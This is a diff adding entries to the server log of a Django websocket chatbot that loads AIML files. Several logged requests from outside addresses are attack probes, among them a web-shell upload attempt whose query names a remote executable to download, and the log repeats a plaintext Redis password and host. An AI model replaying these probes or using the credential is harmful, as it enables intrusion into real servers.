@@ -1,6 +1,496 @@
 
-2019-03-24 19:55:36,904 WARNING  Not Found: /nice ports,/Trinity.txt.bak
-done (0.00 seconds)
+2019-03-25 18:53:26,481 WARNING  Not Found: /FxCodeShell.jsp 
+2019-03-25 18:53:26,502 WARNING  Not Found: /FxCodeShell.jsp::$DATA
+2019-03-25 18:53:26,508 WARNING  Not Found: /FxCodeShell.jsp/
+2019-03-25 18:53:26,514 WARNING  Not Found: /FxCodeShell.jsp
+done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+120.199.34.100:61697 - - [25/Mar/2019:04:42:20] "WSDISCONNECT /ws/chat/007920.2573448321966376/" - -
+112.121.167.170:51640 - - [25/Mar/2019:04:47:22] "POST //wls-wsat/CoordinatorPortType" 404 1121
+120.199.34.100:52255 - - [25/Mar/2019:06:33:04] "WSCONNECTING /ws/chat/917390.047831371640547626/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
+120.199.34.100:52255 - - [25/Mar/2019:06:33:04] "WSCONNECT /ws/chat/917390.047831371640547626/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+120.199.34.100:52255 - - [25/Mar/2019:06:33:15] "WSDISCONNECT /ws/chat/917390.047831371640547626/" - -
+120.199.34.100:52505 - - [25/Mar/2019:06:36:14] "WSCONNECTING /ws/chat/697030.29401743613879283/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
+120.199.34.100:52505 - - [25/Mar/2019:06:36:14] "WSCONNECT /ws/chat/697030.29401743613879283/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+120.199.34.100:52505 - - [25/Mar/2019:06:36:56] "WSDISCONNECT /ws/chat/697030.29401743613879283/" - -
+60.176.231.248:47740 - - [25/Mar/2019:08:49:06] "GET http://www.bing.com/" 404 1121
+60.176.231.248:47738 - - [25/Mar/2019:08:49:06] "GET http://www.123cha.com/" 404 1121
+60.176.231.248:47728 - - [25/Mar/2019:08:49:06] "GET http://www.baidu.com/" 404 1121
+119.29.203.241:54854 - - [25/Mar/2019:18:53:26] "PUT /FxCodeShell.jsp%20" 404 1121
+119.29.203.241:54854 - - [25/Mar/2019:18:53:26] "PUT /FxCodeShell.jsp::$DATA" 404 1121
+119.29.203.241:54854 - - [25/Mar/2019:18:53:26] "PUT /FxCodeShell.jsp/" 404 1121
+119.29.203.241:54854 - - [25/Mar/2019:18:53:26] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
+112.10.182.189:1053 - - [26/Mar/2019:12:25:32] "WSCONNECTING /ws/chat/1/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])2019-03-26 12:42:29,924 ERROR    [Failure instance: Traceback: <class 'ValueError'>: No route found for path 'robot/066290.6072634693715606/'.
+/usr/local/lib/python3.7/site-packages/autobahn/websocket/protocol.py:2801:processHandshake
+/usr/local/lib/python3.7/site-packages/txaio/tx.py:429:as_future
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/ws_protocol.py:82:onConnect
+--- <exception caught here> ---
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/server.py:200:create_application
+/usr/local/lib/python3.7/site-packages/channels/routing.py:58:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:43:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:141:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:165:__init__
+/usr/local/lib/python3.7/site-packages/channels/middleware.py:31:__call__
+/usr/local/lib/python3.7/site-packages/channels/routing.py:154:__call__
+]
+2019-03-26 12:44:16,166 ERROR    [Failure instance: Traceback: <class 'ValueError'>: No route found for path 'robot/290770.3937210361602399/'.
+/usr/local/lib/python3.7/site-packages/autobahn/websocket/protocol.py:2801:processHandshake
+/usr/local/lib/python3.7/site-packages/txaio/tx.py:429:as_future
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/ws_protocol.py:82:onConnect
+--- <exception caught here> ---
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/server.py:200:create_application
+/usr/local/lib/python3.7/site-packages/channels/routing.py:58:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:43:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:141:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:165:__init__
+/usr/local/lib/python3.7/site-packages/channels/middleware.py:31:__call__
+/usr/local/lib/python3.7/site-packages/channels/routing.py:154:__call__
+]
+2019-03-26 12:46:10,100 ERROR    [Failure instance: Traceback: <class 'ValueError'>: No route found for path 'robot/179690.0026952336908543373/'.
+/usr/local/lib/python3.7/site-packages/autobahn/websocket/protocol.py:2801:processHandshake
+/usr/local/lib/python3.7/site-packages/txaio/tx.py:429:as_future
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/ws_protocol.py:82:onConnect
+--- <exception caught here> ---
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/server.py:200:create_application
+/usr/local/lib/python3.7/site-packages/channels/routing.py:58:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:43:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:141:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:165:__init__
+/usr/local/lib/python3.7/site-packages/channels/middleware.py:31:__call__
+/usr/local/lib/python3.7/site-packages/channels/routing.py:154:__call__
+]
+2019-03-26 12:46:31,717 ERROR    [Failure instance: Traceback: <class 'ValueError'>: No route found for path 'robot/470740.02749237322175846/'.
+/usr/local/lib/python3.7/site-packages/autobahn/websocket/protocol.py:2801:processHandshake
+/usr/local/lib/python3.7/site-packages/txaio/tx.py:429:as_future
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/ws_protocol.py:82:onConnect
+--- <exception caught here> ---
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/server.py:200:create_application
+/usr/local/lib/python3.7/site-packages/channels/routing.py:58:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:43:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:141:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:165:__init__
+/usr/local/lib/python3.7/site-packages/channels/middleware.py:31:__call__
+/usr/local/lib/python3.7/site-packages/channels/routing.py:154:__call__
+]
+2019-03-26 12:46:56,674 ERROR    [Failure instance: Traceback: <class 'ValueError'>: No route found for path 'robot/094230.7354791968463301/'.
+/usr/local/lib/python3.7/site-packages/autobahn/websocket/protocol.py:2801:processHandshake
+/usr/local/lib/python3.7/site-packages/txaio/tx.py:429:as_future
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/ws_protocol.py:82:onConnect
+--- <exception caught here> ---
+/usr/local/lib/python3.7/site-packages/twisted/internet/defer.py:151:maybeDeferred
+/usr/local/lib/python3.7/site-packages/daphne/server.py:200:create_application
+/usr/local/lib/python3.7/site-packages/channels/routing.py:58:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:43:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:141:__call__
+/usr/local/lib/python3.7/site-packages/channels/sessions.py:165:__init__
+/usr/local/lib/python3.7/site-packages/channels/middleware.py:31:__call__
+/usr/local/lib/python3.7/site-packages/channels/routing.py:154:__call__
+]
+
+112.10.182.189:1053 - - [26/Mar/2019:12:25:32] "WSCONNECT /ws/chat/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.06 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1053 - - [26/Mar/2019:12:42:08] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1491 - - [26/Mar/2019:12:42:12] "WSCONNECTING /ws/chat/1/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
+112.10.182.189:1491 - - [26/Mar/2019:12:42:12] "WSCONNECT /ws/chat/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1491 - - [26/Mar/2019:12:42:26] "WSDISCONNECT /ws/chat/1/" - -
+112.10.182.189:1515 - - [26/Mar/2019:12:42:34] "WSDISCONNECT /robot/066290.6072634693715606/" - -
+112.10.182.189:1578 - - [26/Mar/2019:12:44:20] "WSDISCONNECT /robot/290770.3937210361602399/" - -
+112.10.182.189:1646 - - [26/Mar/2019:12:46:14] "WSDISCONNECT /robot/179690.0026952336908543373/" - -
+112.10.182.189:1670 - - [26/Mar/2019:12:46:35] "WSDISCONNECT /robot/470740.02749237322175846/" - -
+112.10.182.189:1694 - - [26/Mar/2019:12:47:00] "WSDISCONNECT /robot/094230.7354791968463301/" - -
+2019-03-26 12:51:47,652 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
+2019-03-26 12:51:47,653 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
+2019-03-26 12:51:47,653 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
+2019-03-26 12:51:47,654 INFO     Listening on TCP address 0.0.0.0:8001
+112.10.182.189:1927 - - [26/Mar/2019:12:53:08] "WSCONNECTING /robot/046280.2366555676390072/" - -
+112.10.182.189:1927 - - [26/Mar/2019:12:53:08] "WSCONNECT /robot/046280.2366555676390072/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1927 - - [26/Mar/2019:12:53:28] "WSDISCONNECT /robot/046280.2366555676390072/" - -
+112.10.182.189:1949 - - [26/Mar/2019:12:53:28] "WSCONNECTING /robot/655850.6093779756223143/" - -
+112.10.182.189:1949 - - [26/Mar/2019:12:53:28] "WSCONNECT /robot/655850.6093779756223143/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1949 - - [26/Mar/2019:12:53:39] "WSDISCONNECT /robot/655850.6093779756223143/" - -
+112.10.182.189:1973 - - [26/Mar/2019:12:53:45] "WSCONNECTING /robot/143050.39807580768366213/" - -
+112.10.182.189:1973 - - [26/Mar/2019:12:53:45] "WSCONNECT /robot/143050.39807580768366213/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1973 - - [26/Mar/2019:12:56:00] "WSDISCONNECT /robot/143050.39807580768366213/" - -
+112.10.182.189:2037 - - [26/Mar/2019:12:56:01] "WSCONNECTING /robot/170030.221756514774766/" - -
+112.10.182.189:2037 - - [26/Mar/2019:12:56:01] "WSCONNECT /robot/170030.221756514774766/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:2037 - - [26/Mar/2019:12:57:21] "WSDISCONNECT /robot/170030.221756514774766/" - -
+112.10.182.189:1071 - - [26/Mar/2019:12:57:26] "WSCONNECTING /robot/663060.550623538208243/" - -
+112.10.182.189:1071 - - [26/Mar/2019:12:57:26] "WSCONNECT /robot/663060.550623538208243/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1071 - - [26/Mar/2019:12:58:11] "WSDISCONNECT /robot/663060.550623538208243/" - -
+112.10.182.189:1101 - - [26/Mar/2019:12:58:39] "WSCONNECTING /robot/867640.17039203205407194/" - -
+112.10.182.189:1101 - - [26/Mar/2019:12:58:39] "WSCONNECT /robot/867640.17039203205407194/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1101 - - [26/Mar/2019:13:01:01] "WSDISCONNECT /robot/867640.17039203205407194/" - -
+112.10.182.189:1145 - - [26/Mar/2019:13:01:01] "WSCONNECTING /robot/536480.6775839476261916/" - -
+112.10.182.189:1145 - - [26/Mar/2019:13:01:01] "WSCONNECT /robot/536480.6775839476261916/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
